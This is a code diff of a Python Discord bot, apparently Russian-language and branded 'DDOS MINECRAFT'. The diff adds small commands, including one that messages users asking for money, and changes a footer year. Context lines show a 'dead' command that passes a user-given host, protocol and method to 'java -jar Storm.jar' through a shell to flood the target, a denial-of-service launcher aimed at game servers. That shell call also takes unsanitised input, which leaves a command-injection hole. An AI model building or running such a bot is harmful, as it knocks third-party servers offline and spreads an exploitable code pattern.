@@ -58,13 +58,21 @@ async def dead(ctx, host, proto, method):
         embed.add_field(name='🐻 **BOTNET**', value=f'32', inline=False)
         embed.add_field(name='⚡️**ТОП КРАШЕР**', value=f'DDOS', inline=False)
         embed.set_image(url=f'https://media.tenor.com/PMITaIPBRBkAAAAC/hack-pc.gif')
-        embed.set_footer(text="© 2024 by DDOS MINECRAFT")
+        embed.set_footer(text="© 2023 by DDOS MINECRAFT")
         await ctx.send(embed=embed)
         subprocess.Popen(f'java -jar Storm.jar {host} {proto} {method} {ATTACK_TIME} 3500', shell=True)
 
 @timebotter.command()
 async def ping(ctx):
      await ctx.send(f'BOT PING! {round(timebotter.latency * 1000)}ms')
+
+@timebotter.command()
+async def info(ctx):
+  await ctx.send('exzo')
+
+@timebotter.command()
+async def ютуб(ctx):
+  await ctx.send('ТУТ МОЖЕТ БЫТЬ ВАША ССЫЛКА!')
 
 @timebotter.command()
 async def methods(ctx):
@@ -228,6 +236,10 @@ async def resolve(ctx, arg1):
 async def clear(ctx, amount=None):
     await ctx.channel.purge(limit=int(amount))
     await ctx.channel.send('⚙️ Очищено! ⚙️')
+
+@timebotter.command()
+async def message_send( ctx ):
+    await ctx.author.send( '💡 **Дай деняк?** 💡' )
 
 @timebotter.command()
 async def say(ctx, *, question: commands.clean_content):
